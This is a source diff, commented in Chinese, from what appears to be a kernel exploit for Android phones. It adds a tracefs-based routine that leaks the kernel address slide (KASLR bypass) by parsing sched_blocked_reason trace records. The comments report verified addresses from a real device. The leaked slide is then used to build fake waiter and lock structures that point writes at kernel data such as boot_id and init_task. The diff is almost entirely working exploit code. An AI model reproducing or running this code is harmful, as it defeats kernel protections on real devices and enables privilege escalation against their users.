@@ -21,6 +21,10 @@ static atomic_int slide_consume_calls;
 
 static int slide_word_shift;
 
+/* 线性别名平移量: target.h SLIDE_P0_OFFSET(shennong=0),可用 SLIDE_P0_OFFSET
+ * 环境变量覆盖;data_addr()/p0_data_alias() 统一叠加此值。 */
+uint64_t slide_p0_offset = SLIDE_P0_OFFSET;
+
 void *slide_consumer_thread(void *arg __attribute__((unused)));
 
 int slide_pselect_words_per_set(void) {
@@ -103,16 +107,18 @@ static void prepare_slide_pselect_fdsets_shifted(
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
+    /* 写/读目标一律走 data_addr()(= p0 别名 + slide_p0_offset),
+     * 保证非零 slide 下 boot_id 写目标正确(在 tracefs 泄漏之后构建) */
+    {0, data_addr(SLIDE_LOGGERS_0_1_IMAGE), "tree_pc"},
     {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
+    {2, data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
+    {5, data_addr(SLIDE_LOGGERS_0_1_IMAGE), "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
+    {7, data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "pi2"},
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
+    {10, data_addr(SLIDE_INIT_TASK_IMAGE), "task"},
     {11, fake_lock, "lock"},
     {12, 3, "wake_state"},
     {13, 0, "ww_ctx"},
@@ -404,7 +410,361 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
+/* ================= tracefs sched_blocked_reason 主路线 =================
+ * 参考 S26/m1q(三星)实机验证方法: 启用 sched_blocked_reason 事件后,空闲
+ * kworker 在 worker_thread -> schedule 处阻塞,事件 caller 字段
+ * (stack_trace_save_tsk 保存的返回 PC)是 worker_thread 内 `bl schedule`
+ * 之后那条指令的运行时地址。slide = caller - (KIMAGE_TEXT_BASE +
+ * SLIDE_TRACEFS_WORKER_CALLER_OFF)。shennong 真机已交叉验证:
+ *   worker_thread caller=0xffffffd06fcda4ac,锚点 0xffffffc0080da4ac
+ *   rcu caller        =0xffffffd06fd67b44,锚点 0xffffffc008167b44
+ *   两者推出同一 slide=0x1067C00000(2MB 对齐)
+ * 该路线在 boot_id-route words 构建之前运行,使 data_addr()(p0 别名 +
+ * slide_p0_offset)在非零 slide 下仍指向正确写目标。零漏洞、零 panic 风险;
+ * 失败自动回退 pselect/boot_id 路线。 */
+
+#define SLIDE_TRACEFS_MAX_ROOTS 3
+#define SLIDE_TRACEFS_MAX_CAND 8
+
+static const char *slide_tracefs_roots[SLIDE_TRACEFS_MAX_ROOTS] = {
+  "/sys/kernel/tracing",
+  "/d/tracing",
+  "/sys/kernel/debug/tracing",
+};
+
+struct slide_tracefs_cand {
+  uint64_t slide;
+  int count;
+};
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static int slide_tracefs_read_int(const char *path, int *out) {
+  char buf[32];
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  *out = atoi(buf);
+  return 1;
+}
+
+/* caller 与编译期锚点比对: 命中 worker_thread 或 rcu 锚点(64KB 对齐、限幅)
+ * 则返回 slide,否则 0。 */
+static uint64_t slide_tracefs_candidate(uint64_t caller) {
+  if (caller < KIMAGE_TEXT_BASE) {
+    return 0;
+  }
+  uint64_t d = caller - KIMAGE_TEXT_BASE;
+  if (d >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
+    uint64_t s = d - SLIDE_TRACEFS_WORKER_CALLER_OFF;
+    if (s <= SLIDE_TRACEFS_MAX_SLIDE &&
+        (s & (SLIDE_TRACEFS_ALIGN - 1)) == 0) {
+      return s;
+    }
+  }
+  if (d >= SLIDE_TRACEFS_RCU_CALLER_OFF) {
+    uint64_t s = d - SLIDE_TRACEFS_RCU_CALLER_OFF;
+    if (s <= SLIDE_TRACEFS_MAX_SLIDE &&
+        (s & (SLIDE_TRACEFS_ALIGN - 1)) == 0) {
+      return s;
+    }
+  }
+  return 0;
+}
+
+static void slide_tracefs_note(struct slide_tracefs_cand *c, int *n,
+                               uint64_t slide) {
+  for (int i = 0; i < *n; i++) {
+    if (c[i].slide == slide) {
+      c[i].count++;
+      return;
+    }
+  }
+  if (*n < SLIDE_TRACEFS_MAX_CAND) {
+    c[*n].slide = slide;
+    c[*n].count = 1;
+    (*n)++;
+  }
+}
+
+/* 解析 trace_pipe_raw 单页(4096B): 页头 time_stamp@0 + commit@8,数据从
+ * offset 16 起;事件记录 = 4B 头 + payload(payload 前 8B 为 trace_entry:
+ * u16 type + u8 flags + u8 preempt_count + int pid)。TP_STRUCT__entry 从
+ * payload+8 起。sched_blocked_reason 字段布局因内核而异:
+ *   GKI 6.1: comm[16]@8 pid@24 why@28 caller@32
+ *   三星变体: caller@16
+ * 通用做法: 扫 payload+16..48 的 8B 对齐值,命中锚点即候选。 */
+static int slide_tracefs_parse_page(const unsigned char *page, size_t page_len,
+                                    int event_id,
+                                    struct slide_tracefs_cand *cands,
+                                    int *cand_cnt) {
+  if (page_len < 20) {
+    return 0;
+  }
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+
+  int hits = 0;
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t hdr = 0;
+    memcpy(&hdr, page + pos, sizeof(hdr));
+    uint32_t type_len = hdr & 0x1fU;
+    if (type_len == 30) {       /* TIME_EXTEND */
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {       /* TIME_STAMP */
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+
+    size_t rec_len = (size_t)type_len * 4;
+    size_t rec = pos + 4;
+    if (rec + rec_len > end) {
+      break;
+    }
+
+    if (event_id > 0) {
+      uint16_t id = 0;
+      memcpy(&id, page + rec, sizeof(id));
+      if (id != (uint16_t)event_id) {
+        pos = rec + rec_len;
+        continue;
+      }
+    }
+
+    for (size_t off = 16; off + 8 <= rec_len && off <= 48; off += 8) {
+      uint64_t v = 0;
+      memcpy(&v, page + rec + off, sizeof(v));
+      uint64_t s = slide_tracefs_candidate(v);
+      if (s) {
+        slide_tracefs_note(cands, cand_cnt, s);
+        pr_success("slide tracefs caller=%016llx off=%zu slide=%08llx\n",
+                   (unsigned long long)v, off, (unsigned long long)s);
+        hits++;
+      }
+    }
+    pos = rec + rec_len;
+  }
+  return hits > 0;
+}
+
+/* 文本 trace 兜底: ring buffer 布局无法解析时,从 trace 文本提取 16 位 hex
+ * 内核地址再走锚点校验(符号化行 `SYM+0xOFF` 无绝对地址,自动跳过)。 */
+static void slide_tracefs_parse_text(const char *path,
+                                     struct slide_tracefs_cand *cands,
+                                     int *cand_cnt) {
+  FILE *f = fopen(path, "re");
+  if (!f) {
+    return;
+  }
+  char line[512];
+  while (fgets(line, sizeof(line), f) != NULL) {
+    const char *p = line;
+    while ((p = strstr(p, "ffff")) != NULL) {
+      int ok = 1;
+      for (int i = 0; i < 12; i++) {
+        char c = p[4 + i];
+        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
+              (c >= 'A' && c <= 'F'))) {
+          ok = 0;
+          break;
+        }
+      }
+      if (ok) {
+        uint64_t v = strtoull(p, NULL, 16);
+        uint64_t s = slide_tracefs_candidate(v);
+        if (s) {
+          slide_tracefs_note(cands, cand_cnt, s);
+          pr_success("slide tracefs text caller=%016llx slide=%08llx\n",
+                     (unsigned long long)v, (unsigned long long)s);
+        }
+      }
+      p += 4;
+    }
+  }
+  fclose(f);
+}
+
+/* 从候选集合选 slide: 出现次数最多者;>=2 次为强校验,仅 1 个样本则告警接受 */
+static int slide_tracefs_pick(struct slide_tracefs_cand *cands, int cand_cnt,
+                              uint64_t *slide_out) {
+  if (cand_cnt == 0) {
+    return 0;
+  }
+  int best = 0;
+  for (int i = 1; i < cand_cnt; i++) {
+    if (cands[i].count > cands[best].count) {
+      best = i;
+    }
+  }
+  for (int i = 0; i < cand_cnt; i++) {
+    if (i != best && cands[i].slide != cands[best].slide) {
+      pr_warning("slide tracefs conflicting candidates: %016llx(x%d) vs "
+                 "%016llx(x%d)\n",
+                 (unsigned long long)cands[best].slide, cands[best].count,
+                 (unsigned long long)cands[i].slide, cands[i].count);
+    }
+  }
+  if (cands[best].count < 2) {
+    pr_warning("slide tracefs single sample, no cross-check\n");
+  }
+  *slide_out = cands[best].slide;
+  return 1;
+}
+
+int slide_tracefs_leak_kernel_base(void) {
+  const char *root = NULL;
+  for (size_t i = 0; i < SLIDE_TRACEFS_MAX_ROOTS; i++) {
+    char p[256];
+    snprintf(p, sizeof(p), "%s/tracing_on", slide_tracefs_roots[i]);
+    if (access(p, F_OK) == 0) {
+      root = slide_tracefs_roots[i];
+      break;
+    }
+  }
+  if (!root) {
+    pr_info("slide tracefs root not found\n");
+    return 0;
+  }
+
+  char tracing_on[256];
+  char event_enable[256];
+  char id_path[256];
+  char trace_path[256];
+  char per_cpu[256];
+  snprintf(tracing_on, sizeof(tracing_on), "%s/tracing_on", root);
+  snprintf(event_enable, sizeof(event_enable),
+           "%s/events/sched/sched_blocked_reason/enable", root);
+  snprintf(id_path, sizeof(id_path),
+           "%s/events/sched/sched_blocked_reason/id", root);
+  snprintf(trace_path, sizeof(trace_path), "%s/trace", root);
+
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_info("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+
+  int event_id = 0;
+  slide_tracefs_read_int(id_path, &event_id);
+  pr_info("slide tracefs root=%s event_id=%d\n", root, event_id);
+
+  int tf = open(trace_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (tf >= 0) {
+    close(tf);
+  }
+
+  /* 让空闲 kworker 在 worker_thread -> schedule 阻塞产生事件 */
+  usleep(1500000);
+  slide_tracefs_write(tracing_on, "0");
+
+  struct slide_tracefs_cand cands[SLIDE_TRACEFS_MAX_CAND];
+  memset(cands, 0, sizeof(cands));
+  int cand_cnt = 0;
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  for (int cpu = 0; cpu < cpu_count; cpu++) {
+    snprintf(per_cpu, sizeof(per_cpu), "%s/per_cpu/cpu%d/trace_pipe_raw",
+             root, cpu);
+    int fd = open(per_cpu, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      slide_tracefs_parse_page(page, (size_t)got, event_id, cands,
+                               &cand_cnt);
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+
+  if (cand_cnt == 0) {
+    slide_tracefs_parse_text(trace_path, cands, &cand_cnt);
+  }
+
+  uint64_t slide = 0;
+  if (!slide_tracefs_pick(cands, cand_cnt, &slide)) {
+    pr_info("slide tracefs worker caller not found\n");
+    return 0;
+  }
+
+  kaslr_base = KIMAGE_TEXT_BASE + slide;
+  kaslr_slide = slide;
+  kaslr_done = 1;
+  /* shennong: 物理加载固定,线性别名不随 VA slide(slide_p0_offset 保持 0);
+   * m1q 类机型(物理 KASLR)需在 target.h 将 SLIDE_P0_OFFSET 设为 slide 语义。 */
+  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08llx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide,
+             (unsigned long long)slide_p0_offset);
+  return 1;
+}
+
 int slide_leak_kernel_base(void) {
+  /* 环境变量: SLIDE_P0_OFFSET 强制 p0 别名平移(物理 KASLR 排查用);
+   * SLIDE_FORCE_BOOTID=1 在 tracefs 成功后仍跑 boot_id pselect 验证。 */
+  slide_p0_offset = SLIDE_P0_OFFSET;
+  const char *p0env = getenv("SLIDE_P0_OFFSET");
+  if (p0env && *p0env) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long v = strtoull(p0env, &end, 0);
+    if (!errno && end && !*end && v <= SLIDE_TRACEFS_MAX_SLIDE) {
+      slide_p0_offset = (uint64_t)v;
+      pr_info("slide forced p0_offset=%08llx\n",
+              (unsigned long long)slide_p0_offset);
+    }
+  }
+  int force_bootid = 0;
+  const char *fb = getenv("SLIDE_FORCE_BOOTID");
+  if (fb && strcmp(fb, "1") == 0) {
+    force_bootid = 1;
+  }
+
+  /* 主路线: tracefs sched_blocked_reason caller 泄漏。必须在任何 boot_id
+   * words 使用之前运行,使 data_addr() = p0 别名 + slide_p0_offset 的
+   * 数据别名写目标在非零 slide 下保持正确。 */
+  if (slide_tracefs_leak_kernel_base()) {
+    if (!force_bootid) {
+      return 1;
+    }
+    pr_info("slide tracefs ok (slide=%016llx); forcing boot_id pselect "
+            "route via SLIDE_FORCE_BOOTID\n",
+            (unsigned long long)kaslr_slide);
+  } else {
+    pr_info("slide tracefs route unavailable, falling back to boot_id "
+            "pselect\n");
+  }
+
   int shifts[] = {0, 1, 2, 3, -1, -2};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
 
